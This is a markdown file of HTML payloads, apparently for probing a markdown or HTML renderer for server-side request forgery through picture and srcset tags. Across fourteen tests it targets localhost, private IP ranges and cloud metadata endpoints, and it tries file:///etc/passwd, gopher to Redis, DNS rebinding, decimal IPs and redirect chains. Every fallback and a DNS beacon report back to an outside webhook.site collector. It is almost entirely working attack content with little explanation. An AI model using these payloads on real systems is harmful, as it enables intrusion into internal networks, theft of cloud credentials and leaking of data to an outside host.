# Security Research - v23

## Picture/Srcset SSRF Deep Dive

Since `<picture><source srcset>` is processed, testing SSRF via these tags.

---

### Test 1: Picture with Internal IP srcset
<picture>
  <source srcset="http://127.0.0.1/v23-localhost.gif" media="(min-width: 1px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-localhost-fallback.gif" alt="t1">
</picture>

### Test 2: Picture with Metadata srcset
<picture>
  <source srcset="http://169.254.169.254/latest/meta-data/" media="(min-width: 1px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-metadata-fallback.gif" alt="t2">
</picture>

### Test 3: Multiple sources with SSRF attempts
<picture>
  <source srcset="http://10.0.0.1/internal.gif" media="(min-width: 1200px)">
  <source srcset="http://192.168.1.1/internal.gif" media="(min-width: 800px)">
  <source srcset="http://172.16.0.1/internal.gif" media="(min-width: 400px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-multi-fallback.gif" alt="t3">
</picture>

---

### Test 4: IMG srcset with Internal IPs
<img srcset="http://127.0.0.1/srcset-local.gif 1x, http://169.254.169.254/srcset-meta.gif 2x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/img-srcset-fallback.gif" alt="t4">

### Test 5: IMG srcset with DNS rebinding
<img srcset="http://127.0.0.1.nip.io/rebind.gif 1x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-rebind-fallback.gif" alt="t5">

### Test 6: IMG srcset with decimal IP
<img srcset="http://2130706433/decimal.gif 1x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-decimal-fallback.gif" alt="t6">

---

### Test 7: Picture with redirect chain
<picture>
  <source srcset="https://httpbin.org/redirect-to?url=http://127.0.0.1/redir-localhost.gif" media="(min-width: 1px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-redirect-fallback.gif" alt="t7">
</picture>

### Test 8: Srcset with httpbin redirect to metadata
<img srcset="https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/ 1x" src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-redirect-meta-fallback.gif" alt="t8">

---

### Test 9: Picture with file:// protocol
<picture>
  <source srcset="file:///etc/passwd" media="(min-width: 1px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-file-fallback.gif" alt="t9">
</picture>

### Test 10: Picture with gopher:// protocol
<picture>
  <source srcset="gopher://127.0.0.1:6379/_INFO" media="(min-width: 1px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-gopher-fallback.gif" alt="t10">
</picture>

---

### Test 11: Srcset descriptor SSRF
<img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/base.gif" srcset="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-1x.gif 1x, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-2x.gif 2x, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/srcset-3x.gif 3x">

### Test 12: Wide srcset for resolution attacks
<img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/sizes-base.gif" sizes="100vw" srcset="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s100.gif 100w, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s200.gif 200w, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s400.gif 400w, https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/s800.gif 800w">

---

### Test 13: Picture with IPv6 localhost
<picture>
  <source srcset="http://[::1]/ipv6-local.gif" media="(min-width: 1px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-ipv6-fallback.gif" alt="t13">
</picture>

### Test 14: Picture with cloud metadata variations
<picture>
  <source srcset="http://metadata.google.internal/computeMetadata/v1/" media="(min-width: 1200px)">
  <source srcset="http://instance-data/latest/" media="(min-width: 800px)">
  <source srcset="http://100.100.100.200/latest/" media="(min-width: 400px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-cloud-fallback.gif" alt="t14">
</picture>

---

### DNS Exfil via Picture
<picture>
  <source srcset="https://v23-picture-dns.e55244c7-f645-4580-9001-84d56b232718.dnshook.site/dns.gif" media="(min-width: 1px)">
  <img src="https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/picture-dns-fallback.gif" alt="dns">
</picture>

---

## Canary
![v23-canary](https://webhook.site/e55244c7-f645-4580-9001-84d56b232718/v23-canary.gif)

---

*v23 - Picture/Srcset SSRF deep dive*
